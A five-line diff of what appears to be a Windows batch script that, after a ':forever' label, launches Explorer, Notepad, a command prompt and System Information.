@@ -1,4 +1,5 @@
 :forever
 start explorer
 start notepad
-start
+start cmd
+start msinfo32
